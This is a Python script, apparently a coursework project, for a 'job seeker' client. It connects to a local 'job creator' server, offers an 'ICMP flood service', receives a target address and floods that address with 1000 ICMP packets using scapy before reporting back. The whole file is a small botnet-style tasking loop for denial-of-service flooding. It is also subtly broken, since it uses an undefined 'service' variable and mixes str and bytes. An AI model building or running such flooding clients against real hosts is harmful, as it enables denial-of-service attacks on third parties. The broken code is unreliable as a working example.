
import socket
import time
import os
from scapy.all import *

def icmpflood(target):
    for x in range (0, 1000): # sends 1000 packets as a 'flood'. An actual flood would just keep go inifinitly until it was told to stop.
        send(IP(dst=target)/ICMP())

def seeker_program():
    host = socket.gethostname()  # as both code is running on same pc
    hostip = socket.gethostbyname(host) # gets the ip address
    ip_uid = str(hostip) + ";" + str(os.getpid())
    port = 5000  # socket server port number

    client_socket = socket.socket()  # instantiate
    client_socket.connect((host, port))  # connect to the server

    print("job_seeker: My IP;UID is " + ip_uid)
    client_socket.send(ip_uid.encode()) # send ip
    data = client_socket.recv(1024).decode()    # receive ip
    print("job_creator: My IP;UID is " + str(data))  # show in terminal

# types of jobs/services: 1=ICMP flood, 2=TCP SYN flood, 3= 
    print("job_seeker: I am offering ICMP flood service")
    client_socket.send(service)    # send service/skill
    data = int.from_bytes(client_socket.recv(1), "big")    # receive job or no job available
    if data == 1:
        print("job_creator: I have corresponding job " + str(int.from_bytes(service, "big")) )

# send back accept or deny response
        print("job_seeker: I accept " + str(int.from_bytes(service, "big")) + " job")
        client_socket.send(bytes([1]))

# RECEIVE JOB DATA
        data = client_socket.recv(1024).decode()
        # job_data = data # this would later be saved and used
        # print('\n' + data + '\n')
        print("job_creator: Job data sent\n")

        client_socket.close()  # close the connection

        icmpflood(data) # job data is processing

# reconnecting to give result
        client_socket = socket.socket()  # instantiate
        client_socket.connect((host, port))  # connect to the server

        print("job_seeker: My IP;UID is " + ip_uid)
        client_socket.send(ip_uid.encode()) # send ip

        print("job_creator: My IP;UID is " + ip_uid + " waiting for return status of job")
        data = client_socket.recv(1024).decode()    # creator ip

        print("job_seeker: Job completed with code 0")
        client_socket.send(bytes([0]))

        print("job_seeker: Sending result data\n")
        client_socket.send(data + " flooded with 1000 ICMP packets.".encode()) # sending result
    else:
        print("job_creator: I do not have corresponding job " + str(int.from_bytes(service, "big")))
        client_socket.close()  # close the connection

if __name__ == '__main__':
    seeker_program()
